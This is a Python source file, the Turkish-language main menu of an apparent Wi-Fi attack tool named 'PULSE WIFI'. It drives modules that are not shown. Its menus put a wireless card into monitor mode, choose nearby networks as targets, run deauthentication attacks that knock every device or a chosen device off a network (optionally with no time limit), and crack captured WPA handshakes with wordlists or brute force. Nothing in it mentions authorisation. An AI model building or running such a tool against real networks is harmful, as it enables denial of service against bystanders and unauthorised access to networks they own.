import os
import time
import sys
from modules import engine, radar, strike, decrypt 

class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'
    CYAN = '\033[96m'

def banner():
    os.system('clear' if os.name == 'posix' else 'cls') 
    print(f"{Colors.BLUE}{Colors.BOLD}")
    print(r"""
  _____  _    _ _       _____ ______  __          _______ ______ _____ 
 |  __ \| |  | | |     / ____|  ____| \ \        / /_   _|  ____|_   _|
 | |__) | |  | | |    | (___ | |__     \ \  /\  / /  | | | |__    | |  
 |  ___/| |  | | |     \___ \|  __|     \ \/  \/ /   | | |  __|   | |  
 | |    | |__| | |____ ____) | |____     \  /\  /   _| |_| |     _| |_ 
 |_|     \____/|______|_____/|______|     \/  \/   |_____|_|    |_____|""")
    print(f"{' ' * 51}{Colors.CYAN}by EnesErbap{Colors.END}")
    print(f"{Colors.BLUE}    " + "═" * 62 + f"{Colors.END}")

def menu_box(title, options):
    print(f"\n{Colors.BOLD}    ╔═══════════════ {title.upper()} ═══════════════╗{Colors.END}")
    print(f"    ║                                            ║")
    for opt in options:
        print(f"    ║  {opt} ║")
    print(f"    ║                                            ║")
    print(f"{Colors.BOLD}    ╚════════════════════════════════════════════╝{Colors.END}")

def select_interface():
    ifaces = engine.get_interfaces()
    if not ifaces:
        print(f"    {Colors.RED}[!] Wi-Fi kartı bulunamadı!{Colors.END}")
        time.sleep(2)
        return None
    print(f"\n    {Colors.BOLD}[*] Mevcut Wi-Fi Kartları:{Colors.END}")
    for i, name in enumerate(ifaces):
        print(f"    {Colors.YELLOW}[{i}]{Colors.END} {name}")
    try:
        secim = int(input(f"\n    {Colors.CYAN}Pulse/Iface #{Colors.END} "))
        return ifaces[secim]
    except (ValueError, IndexError):
        return None

def engine_ui():
    while True:
        banner()
        opts = [
            f"{Colors.YELLOW}[1]{Colors.END} Monitör Modunu AÇ (Saldırı Hazırlığı) ",
            f"{Colors.YELLOW}[2]{Colors.END} Monitör Modunu KAPAT (İnterneti Geri Al)",
            f"{Colors.YELLOW}[0]{Colors.END} Ana Menüye Dön                    "
        ]
        menu_box("ENGINE - ADAPTÖR YÖNETİMİ", opts)
        sub = input(f"\n    {Colors.BOLD}Pulse/Engine #{Colors.END} ")
        
        if sub == "1":
            iface = select_interface()
            if iface:
                status, msg = engine.toggle_monitor(iface, "start")
                print(msg)
                time.sleep(2)
        elif sub == "2":
            iface = select_interface()
            if iface:
                success, msg = engine.toggle_monitor(iface, "stop")
                print(msg)
                time.sleep(2)
        elif sub == "0":
            break

def radar_ui():
    while True:
        banner()
        opts = [
            f"{Colors.YELLOW}[1]{Colors.END} Otomatik Hedef Seç (Tavsiye)      ",
            f"{Colors.YELLOW}[2]{Colors.END} Canlı İzleme (Manuel)              ",
            f"{Colors.YELLOW}[0]{Colors.END} Geri                               "
        ]
        menu_box("RADAR / KEŞİF", opts)
        sub = input(f"\n    {Colors.BOLD}Pulse/Radar #{Colors.END} ")

        if sub == "1":
            iface = select_interface()
            if iface:
                # Taramadan önce kartı emin olmak için monitör moduna alır
                engine.toggle_monitor(iface, "start")
                
                found_nets = radar.auto_scan_and_select(iface) 
                
                if not found_nets:
                    print(f"    {Colors.RED}[!] Hiç ağ bulunamadı.{Colors.END}")
                    time.sleep(2)
                    continue
                
                # Sinyal barlı şekilli liste! 'channel' değil 'ch' kullanıyoruz.
                print(f"\n    {Colors.CYAN}{'ID':<3} {'SİNYAL':<15} {'SSID':<25} {'BSSID':<20} {'CH'}{Colors.END}")
                print("    " + "-"*75)
                for i, net in enumerate(found_nets):
                    bar = radar.get_signal_bar(net['dbm'])
                    print(f"    {Colors.YELLOW}[{i}]{Colors.END} {bar:<15} {net['essid'][:23]:<25} {net['bssid']:<20} {net['ch']}")
                
                secim = input(f"\n    Hangi hedef? (ID girin): ")
                if secim.isdigit() and int(secim) < len(found_nets):
                    target = found_nets[int(secim)]
                    print(f"    [✔] Seçilen: {target['essid']}")
                    
                    dosya_adi = input("    Kaydedilecek dosya adı (örneğin 'hedef1'): ")
                    # Burada da 'channel' yerine 'ch' düzelttik
                    radar.target_lock(iface, target['bssid'], target['ch'], dosya_adi)
                else:
                    print("    [!] Geçersiz seçim.")
                    time.sleep(1)

        elif sub == "2":
            iface = select_interface()
            if iface:
                engine.toggle_monitor(iface, "start")
                radar.scan_all(iface)
        elif sub == "0": break

def strike_ui():
    while True:
        banner()
        opts = [
            f"{Colors.YELLOW}[1]{Colors.END} Ağdaki Herkesi Düşür (Broadcast)   ",
            f"{Colors.YELLOW}[2]{Colors.END} Spesifik Cihazı Düşür (Targeted)   ",
            f"{Colors.YELLOW}[0]{Colors.END} Geri                               "
        ]
        menu_box("STRIKE - DEAUTH SALDIRISI", opts)
        sub = input(f"\n    {Colors.BOLD}Pulse/Strike #{Colors.END} ")
        
        if sub == "1" or sub == "2":
            iface = select_interface()
            if not iface: continue
            
            engine.toggle_monitor(iface, "start")
            
            print(f"\n    {Colors.CYAN}[*] Hedef seçimi için etraf taranıyor...{Colors.END}")
            found_nets = radar.auto_scan_and_select(iface) 
            
            if not found_nets:
                print(f"    {Colors.RED}[!] Hiç ağ bulunamadı.{Colors.END}")
                time.sleep(2)
                continue
            
            print(f"\n    {Colors.CYAN}{'ID':<3} {'SİNYAL':<15} {'SSID':<25} {'BSSID':<20} {'CH'}{Colors.END}")
            print("    " + "-"*75)
            for i, net in enumerate(found_nets):
                bar = radar.get_signal_bar(net['dbm'])
                print(f"    {Colors.YELLOW}[{i}]{Colors.END} {bar:<15} {net['essid'][:23]:<25} {net['bssid']:<20} {net['ch']}")
            
            secim = input(f"\n    Hangi ağı düşürüyoruz? (ID girin): ")
            if secim.isdigit() and int(secim) < len(found_nets):
                target = found_nets[int(secim)]
                bssid = target['bssid']
                ch = target['ch'] # HEDEFİN KANALINI ALDIK
                
                print(f"    [✔] Hedef Kilitlendi: {target['essid']} ({bssid}) - Kanal: {ch}")
                
                # İŞTE SİHİRLİ DOKUNUŞ: KARTIN KANALINI HEDEFE SABİTLE!
                engine.run_cmd(f"sudo iwconfig {iface} channel {ch}")
                
                client = input("    Düşürülecek Cihaz MAC (Boş bırakırsan ağdaki herkes düşer): ") if sub == "2" else None
                
                timer_str = input("    Saldırı Süresi (Saniye, sınırsız için 0): ")
                timer = int(timer_str) if timer_str.isdigit() else 0
                
                strike.pulse_kick(iface, bssid, client, timer)
                input("\n    Devam etmek için Enter...")
            else:
                print("    [!] Geçersiz seçim.")
                time.sleep(1)
                
        elif sub == "0": break

def decrypt_ui():
    while True:
        banner()
        opts = [
            f"{Colors.YELLOW}[1]{Colors.END} Wordlist İle Kır (rockyou.txt)     ",
            f"{Colors.YELLOW}[2]{Colors.END} Smart Brute (Sadece Rakamlar vb.)  ",
            f"{Colors.YELLOW}[3]{Colors.END} Handshake Doğrula                  ",
            f"{Colors.YELLOW}[0]{Colors.END} Geri                               "
        ]
        menu_box("DECRYPT", opts)
        sub = input(f"\n    {Colors.BOLD}Pulse/Decrypt #{Colors.END} ")
        
        if sub == "1" or sub == "2" or sub == "3":
            cap = input("    .cap Dosyasının Yolu: ")
            
            if sub == "1":
                wl = input("    Wordlist Yolu (/usr/share/wordlists/rockyou.txt): ")
                decrypt.wordlist_attack(cap, wl or "/usr/share/wordlists/rockyou.txt")
            elif sub == "2":
                essid = input("    Hedef Ağın Adı (ESSID): ")
                uzunluk = input("    Şifre Uzunluğu (Örn: 8): ") or 8
                karakter = input("    Karakter Seti (Örn: 0123456789): ") or "0123456789"
                decrypt.brute_force(cap, essid, karakter, int(uzunluk))
            elif sub == "3":
                strike.verify_handshake(cap)
            
            input("\n    Devam etmek için Enter...")
        elif sub == "0": break

def main():
    try:
        while True:
            banner()
            opts = [
                f"{Colors.YELLOW}[1]{Colors.END} RADAR   (Keşif & Hedef Seçimi)    ",
                f"{Colors.YELLOW}[2]{Colors.END} STRIKE  (Saldırı & Deauth)        ",
                f"{Colors.YELLOW}[3]{Colors.END} DECRYPT (Şifre Kırma & Analiz)    ",
                f"{Colors.YELLOW}[4]{Colors.END} ENGINE  (Sistem & Gizlilik)       ",
                f"{Colors.YELLOW}[0]{Colors.END} Çıkış                             "
            ]
            menu_box("KATEGORİLER", opts)
            choice = input(f"\n    {Colors.BOLD}Pulse #{Colors.END} ")

            if choice == "1": radar_ui()
            elif choice == "2": strike_ui()
            elif choice == "3": decrypt_ui()
            elif choice == "4": engine_ui()
            elif choice == "0":
                print(f"\n    {Colors.BLUE}[*] Pulse kesiliyor... Ağ ayarları onarılıyor...{Colors.END}")
                break
    except KeyboardInterrupt:
        print(f"\n    {Colors.RED}[!] Acil çıkış yapıldı!{Colors.END}")
    finally:
        ifaces = engine.get_interfaces()
        if ifaces:
            engine.toggle_monitor(ifaces[0], "stop")

if __name__ == "__main__":
    main()